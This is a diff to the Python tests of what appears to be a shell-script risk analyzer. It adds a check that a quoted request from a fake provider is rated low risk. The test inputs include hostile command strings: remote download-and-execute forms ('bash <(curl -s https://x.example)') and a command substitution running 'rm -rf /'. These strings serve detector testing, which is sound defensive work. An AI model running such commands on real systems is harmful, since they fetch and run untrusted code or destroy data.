@@ -50,3 +50,10 @@ def test_commented_out_download_execution_is_ignored() -> None:
     )
     assert "remote_code_execution" not in analyze('echo hi  # sh -c "$(curl x)"\n', "/ws").rules
     assert "remote_code_execution" in analyze("bash <(curl -s https://x.example)\n", "/ws").rules
+
+
+def test_quoted_unknown_request_from_fake_provider_is_low_risk() -> None:
+    from termaai.providers import FakeProvider
+
+    script = FakeProvider().generate("say $(rm -rf /) please").script
+    assert analyze(script, "/ws").level is RiskLevel.LOW
